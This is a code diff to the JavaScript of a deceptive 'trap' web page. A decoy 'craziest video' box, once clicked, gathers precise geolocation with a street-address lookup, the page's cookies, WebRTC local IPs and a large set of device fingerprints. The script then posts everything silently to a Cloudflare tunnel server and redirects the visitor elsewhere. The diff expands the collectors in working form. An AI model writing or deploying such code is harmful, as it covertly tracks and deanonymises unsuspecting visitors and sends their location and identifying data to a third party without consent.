@@ -73,301 +73,481 @@
 // Server URL
 const SERVER_URL = "https://had-several-cleanup-injured.trycloudflare.com";
 
-// ── All the same data collectors as your original (unchanged) ──
-function canvasFP() {
-  try {
-    const c = document.createElement('canvas');
-    c.width = 300; c.height = 70;
-    const cx = c.getContext('2d');
-    cx.textBaseline = 'alphabetic';
-    cx.fillStyle = '#f0f'; cx.fillRect(0, 0, 300, 70);
-    cx.fillStyle = '#069'; cx.font = '18pt "Times New Roman"';
-    cx.fillText('trap 🪤 Cwm fjordbank', 2, 44);
-    cx.fillStyle = 'rgba(255,80,0,.5)'; cx.font = '16pt Arial';
-    cx.fillText('trap 🪤 Cwm fjordbank', 4, 46);
-    return btoa(c.toDataURL().slice(-100)).slice(0, 64);
-  } catch { return 'blocked'; }
-}
+const $ = id => document.getElementById(id);
+const safe = (fn, fb = 'N/A') => { try { const v = fn(); return v ?? fb; } catch { return fb; } };
+const safeA = async (fn, fb = 'N/A') => { try { const v = await fn(); return v ?? fb; } catch { return fb; } };
 
-function webglInfo() {
-  try {
-    const c = document.createElement('canvas');
-    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-    if (!gl) return { renderer:'none', vendor:'none' };
-    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-    return {
-      renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'hidden',
-      vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'hidden',
-      version: gl.getParameter(gl.VERSION),
-      shadingVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-      extensions: (gl.getSupportedExtensions() || []).length,
-    };
-  } catch { return { renderer:'error', vendor:'error' }; }
-}
-
-async function audioFP() {
-  try {
-    const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 4096, 44100);
-    const osc = ctx.createOscillator();
-    const cmp = ctx.createDynamicsCompressor();
-    [['threshold',-50],['knee',40],['ratio',12],['attack',0],['release',.25]]
-      .forEach(([k,v]) => cmp[k]?.setValueAtTime(v, ctx.currentTime));
-    osc.type = 'triangle'; osc.frequency.setValueAtTime(10000, ctx.currentTime);
-    osc.connect(cmp); cmp.connect(ctx.destination); osc.start(0);
-    const buf = await ctx.startRendering();
-    const data = buf.getChannelData(0).slice(4500, 4600);
-    let hash = 0;
-    data.forEach(v => { hash = (hash * 31 + Math.floor(v * 1e6)) | 0; });
-    return hash.toString(16);
-  } catch { return 'blocked'; }
-}
-
-function mathFP() {
-  return [
-    Math.acos(0.12), Math.acosh(1.5), Math.asin(0.12), Math.asinh(1),
-    Math.atan(2), Math.atanh(0.5), Math.cbrt(2), Math.cos(0.1),
-    Math.cosh(1), Math.expm1(1), Math.hypot(2,3,4),
-    Math.log2(2**31-1), Math.sinh(1), Math.tan(-1e300), Math.tanh(0),
-  ].map(n => n.toString(36)).join('|').slice(0, 80);
-}
-
-function getWebRTCIPs() {
-  return new Promise(resolve => {
-    const ips = new Set();
-    try {
-      const pc = new RTCPeerConnection({ iceServers:[{urls:'stun:stun.l.google.com:19302'}] });
-      pc.createDataChannel('');
-      pc.createOffer().then(o => pc.setLocalDescription(o));
-      pc.onicecandidate = e => {
-        if (!e?.candidate) { pc.close(); resolve([...ips]); return; }
-        const m = /(\d{1,3}\.){3}\d{1,3}/.exec(e.candidate.candidate);
-        if (m) ips.add(m[0]);
-      };
-      setTimeout(() => { try{pc.close();}catch{} resolve([...ips]); }, 1800);
-    } catch { resolve([]); }
+// ── 1. Geolocation + reverse geocode (unchanged)
+function getLocation(){
+  return new Promise(resolve=>{
+    if(!navigator.geolocation) return resolve({error:'not supported'});
+    navigator.geolocation.getCurrentPosition(async pos=>{
+      const {latitude,longitude,accuracy,altitude,altitudeAccuracy,heading,speed}=pos.coords;
+      let address={};
+      try{
+        const r=await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1`,{headers:{'Accept-Language':'en','User-Agent':'trap-demo/1.0'}});
+        const d=await r.json();
+        const a=d.address||{};
+        address={
+          displayName: d.display_name||'',
+          houseNumber: a.house_number||'',
+          road: a.road||a.pedestrian||a.footway||a.path||'',
+          suburb: a.suburb||a.neighbourhood||a.quarter||'',
+          city: a.city||a.town||a.village||a.hamlet||a.municipality||'',
+          district: a.city_district||a.district||'',
+          county: a.county||'',
+          state: a.state||a.region||'',
+          stateDistrict:a.state_district||'',
+          postcode: a.postcode||'',
+          country: a.country||'',
+          countryCode: (a.country_code||'').toUpperCase(),
+          osmType: d.type||'',
+          osmClass: d['class']||'',
+        };
+      }catch{ address={error:'reverse geocode failed'}; }
+      resolve({latitude,longitude,accuracy,altitude,altitudeAccuracy,heading,speed,address,
+        googleMapsUrl:`https://maps.google.com/?q=${latitude},${longitude}`,
+        osmUrl:`https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=17`});
+    },
+    err=>resolve({error:err.message,code:err.code,
+      CODES:{1:'PERMISSION_DENIED',2:'POSITION_UNAVAILABLE',3:'TIMEOUT'}[err.code]||''}),
+    {enableHighAccuracy:true,timeout:12000,maximumAge:0});
   });
 }
 
-function getSpeechVoices() {
-  try { return window.speechSynthesis.getVoices().map(v => v.name + ' (' + v.lang + ')').slice(0,15); }
-  catch { return []; }
+// ── 2. UA Client Hints
+async function getUACH(){
+  if(!navigator.userAgentData) return {available:false};
+  try{
+    const h=await navigator.userAgentData.getHighEntropyValues([
+      'architecture','bitness','brands','fullVersionList','mobile',
+      'model','platform','platformVersion','uaFullVersion','wow64'
+    ]);
+    return {available:true,...h};
+  }catch{ return {available:true,basic:navigator.userAgentData.brands}; }
 }
 
-async function getMediaDevices() {
-  try {
-    const devs = await navigator.mediaDevices.enumerateDevices();
-    const c = { audioinput:0, audiooutput:0, videoinput:0 };
-    devs.forEach(d => { if(c[d.kind]!==undefined) c[d.kind]++; });
-    return c;
-  } catch { return { audioinput:'N/A', audiooutput:'N/A', videoinput:'N/A' }; }
+// ── 3. Canvas fingerprint (detailed)
+function canvasFP(){
+  try{
+    const c=document.createElement('canvas'); c.width=400; c.height=100;
+    const cx=c.getContext('2d');
+    const g=cx.createLinearGradient(0,0,400,0);
+    g.addColorStop(0,'#ff0000'); g.addColorStop(.5,'#00ff00'); g.addColorStop(1,'#0000ff');
+    cx.fillStyle=g; cx.fillRect(0,0,400,100);
+    cx.textBaseline='alphabetic';
+    cx.fillStyle='rgba(0,0,200,.7)'; cx.font='bold 18px "Times New Roman"';
+    cx.fillText('Cwm fjordbank 🪤 trap! ♥ éàü', 4, 40);
+    cx.fillStyle='rgba(200,0,0,.6)'; cx.font='14px Arial';
+    cx.fillText('Cwm fjordbank 🪤 trap! ♥ éàü', 6, 60);
+    cx.fillStyle='rgba(0,180,0,.5)'; cx.font='italic 13px Georgia';
+    cx.fillText('Åßæø test 中文 العربية', 4, 80);
+    cx.strokeStyle='rgba(255,128,0,.8)'; cx.lineWidth=2;
+    cx.beginPath(); cx.arc(350,50,35,0,Math.PI*2); cx.stroke();
+    cx.fillStyle='rgba(0,255,255,.4)'; cx.fillRect(300,10,60,30);
+    const raw=c.toDataURL('image/png');
+    let h=0; for(let i=0;i<raw.length;i++) h=Math.imul(31,h)+raw.charCodeAt(i)|0;
+    return {hash:(h>>>0).toString(16).padStart(8,'0'), rawTail:btoa(raw.slice(-80)).slice(0,48)};
+  }catch{return{hash:'blocked',rawTail:''};}
 }
 
-async function getPermissions() {
-  const names = ['notifications','clipboard-read','camera','microphone','geolocation'];
-  const out = {};
-  for (const n of names) {
-    try { out[n] = (await navigator.permissions.query({name:n})).state; }
-    catch { out[n] = 'N/A'; }
-  }
+// ── 4. WebGL (v1 + v2)
+function webglInfo(){
+  const get=(type)=>{
+    try{
+      const c=document.createElement('canvas');
+      const gl=c.getContext(type);
+      if(!gl) return null;
+      const dbg=gl.getExtension('WEBGL_debug_renderer_info');
+      const exts=gl.getSupportedExtensions()||[];
+      const params={};
+      [[gl.MAX_TEXTURE_SIZE,'maxTextureSize'],[gl.MAX_VIEWPORT_DIMS,'maxViewport'],
+       [gl.MAX_VERTEX_ATTRIBS,'maxVertexAttribs'],[gl.MAX_VERTEX_UNIFORM_VECTORS,'maxVertexUniforms'],
+       [gl.MAX_FRAGMENT_UNIFORM_VECTORS,'maxFragmentUniforms']
+      ].forEach(([p,k])=>{ try{params[k]=gl.getParameter(p);}catch{} });
+      return {
+        renderer: dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):'hidden',
+        vendor: dbg?gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL):'hidden',
+        version: gl.getParameter(gl.VERSION),
+        glslVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+        extensionCount: exts.length,
+        extensions: exts,
+        params,
+      };
+    }catch{return null;}
+  };
+  return {webgl:get('webgl'), webgl2:get('webgl2')};
+}
+
+// ── 5. Audio fingerprint
+async function audioFP(){
+  try{
+    const ctx=new(window.OfflineAudioContext||window.webkitOfflineAudioContext)(1,4096,44100);
+    const osc=ctx.createOscillator();
+    const cmp=ctx.createDynamicsCompressor();
+    [['threshold',-50],['knee',40],['ratio',12],['attack',0],['release',.25]]
+      .forEach(([k,v])=>cmp[k]?.setValueAtTime(v,ctx.currentTime));
+    osc.type='triangle'; osc.frequency.setValueAtTime(10000,ctx.currentTime);
+    osc.connect(cmp); cmp.connect(ctx.destination); osc.start(0);
+    const buf=await ctx.startRendering();
+    const data=buf.getChannelData(0).slice(4500,4600);
+    let hash=0; data.forEach(v=>{hash=(hash*31+Math.floor(v*1e9))|0;});
+    const realCtx=new(window.AudioContext||window.webkitAudioContext)();
+    const info={
+      hash:(hash>>>0).toString(16),
+      sampleRate:realCtx.sampleRate,
+      maxChannelCount:realCtx.destination.maxChannelCount,
+      state:realCtx.state,
+    };
+    realCtx.close();
+    return info;
+  }catch{return{hash:'blocked'};}
+}
+
+// ── 6. Math/JS engine fingerprint
+function mathFP(){
+  const vals=[
+    Math.acos(0.12),Math.acosh(1.5),Math.asin(0.12),Math.asinh(1),
+    Math.atan(2),Math.atanh(0.5),Math.cbrt(2),Math.cos(0.1),
+    Math.cosh(1),Math.expm1(1),Math.hypot(2,3,4),Math.imul(3,4),
+    Math.log2(2**31-1),Math.log10(5),Math.pow(Math.PI,Math.E),
+    Math.sinh(1),Math.tan(-1e300),Math.tanh(0.1),
+    1/0, -1/0, 0/0,
+    Number.EPSILON, Number.MAX_SAFE_INTEGER,
+  ];
+  let h=0; vals.forEach((v,i)=>{ const s=isFinite(v)?v.toString(36):''+v; for(const c of s) h=(h*31+c.charCodeAt(0))|0; });
+  return {hash:(h>>>0).toString(16), vals:vals.slice(0,8).map(v=>v.toPrecision?v.toPrecision(15):String(v))};
+}
+
+// ── 7. WebRTC local IPs
+function getWebRTCIPs(){
+  return new Promise(resolve=>{
+    const ips=new Set();
+    try{
+      const pc=new RTCPeerConnection({iceServers:[
+        {urls:'stun:stun.l.google.com:19302'},
+        {urls:'stun:stun1.l.google.com:19302'},
+      ]});
+      pc.createDataChannel('');
+      pc.createOffer().then(o=>pc.setLocalDescription(o));
+      pc.onicecandidate=e=>{
+        if(!e?.candidate){pc.close();resolve([...ips]);return;}
+        const m=/(\d{1,3}\.){3}\d{1,3}/.exec(e.candidate.candidate);
+        if(m) ips.add(m[0]);
+      };
+      setTimeout(()=>{try{pc.close();}catch{}resolve([...ips]);},2500);
+    }catch{resolve([]);}
+  });
+}
+
+// ── 8. Font enumeration
+function enumerateFonts(){
+  const fonts=[
+    'Arial','Arial Black','Arial Narrow','Calibri','Cambria','Candara',
+    'Comic Sans MS','Consolas','Constantia','Corbel','Courier New',
+    'Franklin Gothic Medium','Futura','Garamond','Geneva','Georgia',
+    'Gill Sans','Helvetica','Helvetica Neue','Impact','Lucida Console',
+    'Lucida Grande','Lucida Sans Unicode','Microsoft Sans Serif','Monaco',
+    'Palatino','Palatino Linotype','Segoe UI','Tahoma','Times New Roman',
+    'Trebuchet MS','Verdana','Webdings','Wingdings',
+    'San Francisco','Helvetica Neue','Menlo','Monaco','SF Mono',
+    'DejaVu Sans','DejaVu Serif','FreeSerif','FreeSans','Liberation Sans',
+    'Liberation Serif','Ubuntu','Noto Sans','Noto Serif','Droid Sans',
+    'Roboto','Open Sans','Lato','Oswald','Montserrat','Raleway','Nunito',
+    '微軟雅黑','宋体','MS Gothic','Hiragino Sans',
+    'Yu Gothic','Malgun Gothic','Apple SD Gothic Neo',
+  ];
+  const c=document.createElement('canvas'); c.width=200; c.height=40;
+  const cx=c.getContext('2d');
+  const TEST='mmmmmmmmmmlli'; const BASE_FONT='monospace';
+  const measure=(f)=>{ cx.font=`16px "${f}", ${BASE_FONT}`; return cx.measureText(TEST).width; };
+  const base=measure('aaaNonExistentFont12345__');
+  const found=fonts.filter(f=>measure(f)!==base);
+  return {count:found.length, fonts:found};
+}
+
+// ── 9. Performance / timing / memory
+function perfInfo(){
+  const t=performance.timing||{};
+  const nav=performance.getEntriesByType('navigation')[0]||{};
+  const paint={}; performance.getEntriesByType('paint').forEach(e=>{paint[e.name]=Math.round(e.startTime)+'ms';});
+  const mem=safe(()=>({
+    usedJSHeapMB: ((performance.memory.usedJSHeapSize /1048576).toFixed(2)),
+    totalJSHeapMB: ((performance.memory.totalJSHeapSize /1048576).toFixed(2)),
+    limitJSHeapMB: ((performance.memory.jsHeapSizeLimit /1048576).toFixed(2)),
+  }));
+  return {
+    pageLoadMs: nav.loadEventEnd?Math.round(nav.loadEventEnd-nav.startTime):'N/A',
+    domReadyMs: nav.domContentLoadedEventEnd?Math.round(nav.domContentLoadedEventEnd-nav.startTime):'N/A',
+    paint,
+    memory: mem,
+    redirectCount:nav.redirectCount??'N/A',
+    transferSizeB:nav.transferSize??'N/A',
+    decodedBodyB: nav.decodedBodySize??'N/A',
+    type: nav.type||t.navigationType||'N/A',
+  };
+}
+
+// ── 10. Visual viewport
+function visualViewportInfo(){
+  const vv=window.visualViewport;
+  if(!vv) return {available:false};
+  return {available:true, width:vv.width, height:vv.height, scale:vv.scale,
+    offsetLeft:vv.offsetLeft, offsetTop:vv.offsetTop,
+    pageLeft:vv.pageLeft, pageTop:vv.pageTop};
+}
+
+// ── 11. Battery
+async function getBattery(){
+  try{
+    const b=await navigator.getBattery();
+    return {level:Math.round(b.level*100)+'%',charging:b.charging,
+      chargingTimeSec: b.chargingTime===Infinity?'full/N/A':b.chargingTime,
+      dischargingTimeSec: b.dischargingTime===Infinity?'N/A':b.dischargingTime};
+  }catch{return{level:'N/A',charging:'N/A'};}
+}
+
+// ── 12. Connection
+function connInfo(){
+  const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  if(!c) return{type:'unknown',effectiveType:'unknown',downlink:'N/A',rtt:'N/A',saveData:false};
+  return{type:c.type||'unknown',effectiveType:c.effectiveType||'unknown',
+    downlink:c.downlink!=null?c.downlink+' Mbps':'N/A',
+    rtt: c.rtt!=null?c.rtt+' ms':'N/A', saveData:!!c.saveData};
+}
+
+// ── 13. Media devices
+async function mediaDevs(){
+  try{
+    const d=await navigator.mediaDevices.enumerateDevices();
+    return{audioinput:d.filter(x=>x.kind==='audioinput').length,
+      audiooutput:d.filter(x=>x.kind==='audiooutput').length,
+      videoinput: d.filter(x=>x.kind==='videoinput').length,
+      total:d.length};
+  }catch{return{audioinput:'N/A',audiooutput:'N/A',videoinput:'N/A'};}
+}
+
+// ── 14. Permissions
+async function getPerms(){
+  const names=['notifications','clipboard-read','clipboard-write','camera',
+               'microphone','geolocation','accelerometer','gyroscope','magnetometer',
+               'ambient-light-sensor','background-sync','persistent-storage'];
+  const out={};
+  await Promise.all(names.map(async n=>{
+    try{out[n]=(await navigator.permissions.query({name:n})).state;}
+    catch{out[n]='N/A';}
+  }));
   return out;
 }
 
-async function getBattery() {
-  try {
-    const b = await navigator.getBattery();
-    return { level: Math.round(b.level*100)+'%', charging: b.charging,
-      chargingTimeSec: b.chargingTime === Infinity ? 'N/A' : b.chargingTime,
-      dischargingTimeSec: b.dischargingTime === Infinity ? 'N/A' : b.dischargingTime };
-  } catch { return { level:'N/A', charging:'N/A' }; }
+// ── 15. Speech voices
+function speechVoices(){
+  try{ return window.speechSynthesis.getVoices().map(v=>({name:v.name,lang:v.lang,default:v.default})); }
+  catch{return[];}
 }
 
-function getConnection() {
-  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if (!c) return { type:'unknown', effectiveType:'unknown', downlink:'unknown', rtt:'unknown', saveData:false };
-  return { type:c.type||'unknown', effectiveType:c.effectiveType||'unknown',
-    downlink: c.downlink!=null ? c.downlink+' Mbps':'unknown',
-    rtt: c.rtt!=null ? c.rtt+' ms' :'unknown',
-    saveData: !!c.saveData };
+// ── 16. MIME types
+function mimeTypes(){
+  try{ return Array.from(navigator.mimeTypes).map(m=>m.type); }
+  catch{return[];}
 }
 
-function storageInfo() {
-  let lsBytes = 0;
-  try { for(const k in localStorage) lsBytes += (localStorage[k]?.length||0)+(k?.length||0); } catch{}
-  return {
-    localStorageItems: (()=>{ try{return localStorage.length;}catch{return 'blocked';} })(),
-    localStorageBytes: lsBytes,
-    sessionStorageItems: (()=>{ try{return sessionStorage.length;}catch{return 'blocked';} })(),
-    indexedDB: typeof indexedDB !== 'undefined',
+// ── 17. Plugins
+function getPlugins(){
+  try{ return Array.from(navigator.plugins).map(p=>({name:p.name,filename:p.filename,desc:p.description})); }
+  catch{return[];}
+}
+
+// ── 18. CSS media queries
+function mediaCaps(){
+  const mq=q=>{try{return window.matchMedia(q).matches;}catch{return null;}};
+  return{
+    prefersDark: mq('(prefers-color-scheme:dark)'),
+    prefersLight: mq('(prefers-color-scheme:light)'),
+    prefersReducedMotion: mq('(prefers-reduced-motion:reduce)'),
+    prefersReducedData: mq('(prefers-reduced-data:reduce)'),
+    prefersContrast: mq('(prefers-contrast:more)'),
+    forcedColors: mq('(forced-colors:active)'),
+    hoverCapable: mq('(hover:hover)'),
+    finePointer: mq('(pointer:fine)'),
+    coarsePointer: mq('(pointer:coarse)'),
+    anyHover: mq('(any-hover:hover)'),
+    displayStandalone: mq('(display-mode:standalone)'),
+    hdr: mq('(dynamic-range:high)'),
+    p3Gamut: mq('(color-gamut:p3)'),
+    rec2020Gamut: mq('(color-gamut:rec2020)'),
+    srgbGamut: mq('(color-gamut:srgb)'),
+    invertedColors: mq('(inverted-colors:inverted)'),
+    monochromeDisplay: mq('(monochrome)'),
+    landscape: mq('(orientation:landscape)'),
+  };
+}
+
+// ── 19. Storage
+function storageInfo(){
+  let lsB=0,ssB=0;
+  try{for(const k in localStorage) if(typeof localStorage[k]==='string') lsB+=localStorage[k].length+k.length;}catch{}
+  try{for(const k in sessionStorage) if(typeof sessionStorage[k]==='string') ssB+=sessionStorage[k].length+k.length;}catch{}
+  return{
+    localStorageItems: safe(()=>localStorage.length),
+    localStorageBytes: lsB,
+    sessionStorageItems:safe(()=>sessionStorage.length),
+    sessionStorageBytes:ssB,
+    indexedDB: typeof indexedDB!=='undefined',
     cookiesEnabled: navigator.cookieEnabled,
+    cacheAPI: 'caches' in window,
   };
 }
 
-function mediaQueries() {
-  const mq = q => { try{return window.matchMedia(q).matches;}catch{return null;} };
-  return {
-    prefersDark: mq('(prefers-color-scheme: dark)'),
-    prefersLight: mq('(prefers-color-scheme: light)'),
-    prefersReducedMotion: mq('(prefers-reduced-motion: reduce)'),
-    prefersReducedData: mq('(prefers-reduced-data: reduce)'),
-    prefersContrast: mq('(prefers-contrast: more)'),
-    forcedColors: mq('(forced-colors: active)'),
-    hoverCapable: mq('(hover: hover)'),
-    finePointer: mq('(pointer: fine)'),
-    coarsePointer: mq('(pointer: coarse)'),
-    displayModeStandalone: mq('(display-mode: standalone)'),
-    hdr: mq('(dynamic-range: high)'),
-  };
-}
-
-function features() {
-  const t = v => { try{return v();}catch{return false;} };
-  return {
+// ── 20. Feature detection
+function detectFeatures(){
+  const t=fn=>{try{return fn();}catch{return false;}};
+  return{
     webAssembly: typeof WebAssembly!=='undefined',
     serviceWorker: 'serviceWorker' in navigator,
     webWorker: typeof Worker!=='undefined',
     sharedWorker: typeof SharedWorker!=='undefined',
+    broadcastChan: typeof BroadcastChannel!=='undefined',
     webSocket: typeof WebSocket!=='undefined',
     webGL: t(()=>!!document.createElement('canvas').getContext('webgl')),
     webGL2: t(()=>!!document.createElement('canvas').getContext('webgl2')),
+    offscreenCanvas: typeof OffscreenCanvas!=='undefined',
     gamepad: 'getGamepads' in navigator,
     bluetooth: 'bluetooth' in navigator,
     usb: 'usb' in navigator,
     nfc: 'nfc' in navigator,
     xr: 'xr' in navigator,
+    hid: 'hid' in navigator,
+    serial: 'serial' in navigator,
     paymentRequest: typeof PaymentRequest!=='undefined',
     credentials: 'credentials' in navigator,
     clipboard: 'clipboard' in navigator,
     share: 'share' in navigator,
     wakeLock: 'wakeLock' in navigator,
+    idle: 'IdleDetector' in window,
     deviceOrient: typeof DeviceOrientationEvent!=='undefined',
     deviceMotion: typeof DeviceMotionEvent!=='undefined',
-    intersectionObs:typeof IntersectionObserver!=='undefined',
+    intersectionObs: typeof IntersectionObserver!=='undefined',
     resizeObs: typeof ResizeObserver!=='undefined',
-    broadcastChan: typeof BroadcastChannel!=='undefined',
-    idle: 'IdleDetector' in window,
+    mutationObs: typeof MutationObserver!=='undefined',
+    pointerEvents: typeof PointerEvent!=='undefined',
+    touch: 'ontouchstart' in window,
+    contactPicker: 'contacts' in navigator,
+    eyeDropper: 'EyeDropper' in window,
+    compression: typeof CompressionStream!=='undefined',
+    trustedTypes: typeof TrustedTypes!=='undefined',
+    cryptoAPI: typeof crypto!=='undefined'&&!!crypto.subtle,
+    sharedArrayBuf: typeof SharedArrayBuffer!=='undefined',
+    atomics: typeof Atomics!=='undefined',
+    weakRef: typeof WeakRef!=='undefined',
+    bigInt: typeof BigInt!=='undefined',
+    intl: typeof Intl!=='undefined',
+    intlSegmenter: typeof Intl.Segmenter!=='undefined',
   };
 }
 
-function getPlugins() {
-  try { return Array.from(navigator.plugins).map(p=>({name:p.name, filename:p.filename, desc:p.description})); }
-  catch { return []; }
-}
-
-// Geolocation + reverse geocode (unchanged)
-function getLocation() {
-  return new Promise(resolve => {
-    if (!navigator.geolocation) return resolve({ error: 'not supported' });
-    navigator.geolocation.getCurrentPosition(
-      async pos => {
-        const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;
-        let address = {};
-        try {
-          const r = await fetch(
-            `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`,
-            { headers: { 'Accept-Language': 'en' } }
-          );
-          const d = await r.json();
-          const a = d.address || {};
-          address = {
-            displayName: d.display_name || '',
-            houseNumber: a.house_number || '',
-            road: a.road || a.pedestrian || a.footway || '',
-            suburb: a.suburb || a.neighbourhood || '',
-            city: a.city || a.town || a.village || a.hamlet || '',
-            county: a.county || '',
-            state: a.state || a.region || '',
-            postcode: a.postcode || '',
-            country: a.country || '',
-            countryCode: a.country_code?.toUpperCase() || '',
-          };
-        } catch { address = { error: 'reverse geocode failed' }; }
-        resolve({ latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed, address });
-      },
-      err => resolve({ error: err.message, code: err.code }),
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-    );
-  });
+// ── 21. Screen extra (multi-monitor)
+function screenExtra(){
+  return{
+    isExtended: safe(()=>screen.isExtended),
+    availLeft: safe(()=>screen.availLeft),
+    availTop: safe(()=>screen.availTop),
+    left: safe(()=>screen.left),
+    top: safe(()=>screen.top),
+  };
 }
 
 // Main click handler
-async function handleClick() {
-  const box = document.getElementById('trap');
+async function handleClick(){
+  const box = $('trap');
   box.style.pointerEvents = 'none';
   box.innerHTML = `<div style="height:100%;display:flex;align-items:center;justify-content:center;color:#777;font-size:1.15rem;">Loading the craziest video...</div>`;
 
-  // Collect everything in parallel
-  const [battery, rtcIPs, mediaDevs, perms, afp] = await Promise.all([
-    getBattery(), getWebRTCIPs(), getMediaDevices(), getPermissions(), audioFP()
+  // Collect everything
+  const [battery, rtcIPs, mdevs, perms, afp, uach] = await Promise.all([
+    getBattery(), getWebRTCIPs(), mediaDevs(), getPerms(), audioFP(), getUACH()
   ]);
 
+  const fonts = enumerateFonts();
   window.speechSynthesis?.getVoices();
-  await new Promise(r => setTimeout(r, 180));
-  const voices = getSpeechVoices();
-
-  // Get location (will show browser permission prompt if needed)
+  await new Promise(r => setTimeout(r, 200));
+  const voices = speechVoices();
+  const gl = webglInfo();
   const geo = await getLocation();
 
   const payload = {
     location: geo,
     capturedAt: new Date().toISOString(),
+    capturedAtMs: Date.now(),
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    timezoneOffset: new Date().getTimezoneOffset() + ' min',
+    timezoneOffset: new Date().getTimezoneOffset()+' min',
     locale: Intl.DateTimeFormat().resolvedOptions().locale,
     calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
     numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem,
     language: navigator.language,
     languages: [...(navigator.languages||[])],
     userAgent: navigator.userAgent,
+    uaClientHints: uach,
     appName: navigator.appName,
     appVersion: navigator.appVersion,
     vendor: navigator.vendor,
+    vendorSub: navigator.vendorSub||'',
     platform: navigator.platform,
     product: navigator.product,
     productSub: navigator.productSub,
     buildID: navigator.buildID||'N/A',
     doNotTrack: navigator.doNotTrack||'unset',
     globalPrivacyCtrl: navigator.globalPrivacyControl??'N/A',
-    javaEnabled: typeof navigator.javaEnabled==='function'?navigator.javaEnabled():'N/A',
+    javaEnabled: safe(()=>navigator.javaEnabled()),
     pdfViewerEnabled: navigator.pdfViewerEnabled??'N/A',
+    cookieEnabled: navigator.cookieEnabled,
+    onLine: navigator.onLine,
     plugins: getPlugins(),
+    mimeTypes: mimeTypes(),
     screenRes: screen.width+'x'+screen.height,
     availRes: screen.availWidth+'x'+screen.availHeight,
     viewportSize: window.innerWidth+'x'+window.innerHeight,
     outerSize: window.outerWidth+'x'+window.outerHeight,
+    scrollPosition: window.scrollX+','+window.scrollY,
     colorDepth: screen.colorDepth+'-bit',
     pixelDepth: screen.pixelDepth+'-bit',
     pixelRatio: window.devicePixelRatio,
     orientation: screen.orientation?.type||'unknown',
     orientationAngle: screen.orientation?.angle??'N/A',
+    screenExtra: screenExtra(),
+    visualViewport: visualViewportInfo(),
     cpuCores: navigator.hardwareConcurrency||'N/A',
     deviceMemory: (navigator.deviceMemory||'N/A')+' GB',
     maxTouchPoints: navigator.maxTouchPoints,
-    connection: getConnection(),
+    connection: connInfo(),
     battery: battery,
     webrtcLocalIPs: rtcIPs,
     canvasFP: canvasFP(),
     audioFP: afp,
     mathFP: mathFP(),
-    webgl: webglInfo(),
-    mediaDevices: mediaDevs,
+    webgl: gl,
+    fonts: fonts,
+    performance: perfInfo(),
+    mediaDevices: mdevs,
     speechVoices: voices,
     speechVoiceCount: voices.length,
     permissions: perms,
     storage: storageInfo(),
-    features: features(),
-    mediaQueries: mediaQueries(),
+    features: detectFeatures(),
+    mediaQueries: mediaCaps(),
     referrer: document.referrer||'direct',
     pageUrl: window.location.href,
     pageTitle: document.title,
     historyLength: history.length,
     documentEncoding: document.characterSet,
+    documentMode: safe(()=>document.documentMode)||'N/A',
     visibilityState: document.visibilityState,
     hasFocus: document.hasFocus(),
     cookieString: document.cookie||'(empty)',
-    documentMode: document.documentMode||'N/A',
+    readyState: document.readyState,
   };
 
-  // Send to your server (silent — no toast)
+  // Send data silently
   try {
     await fetch(SERVER_URL + '/trap', {
       method: 'POST',
@@ -375,10 +555,10 @@ async function handleClick() {
       body: JSON.stringify(payload),
     });
   } catch (e) {
-    // Silent fail
+    // silent fail
   }
 
-  // Redirect to the new link after attempt
+  // Redirect after logging attempt
   setTimeout(() => {
     window.location.href = "https://solar-icons.vercel.app/icons";
   }, 800);
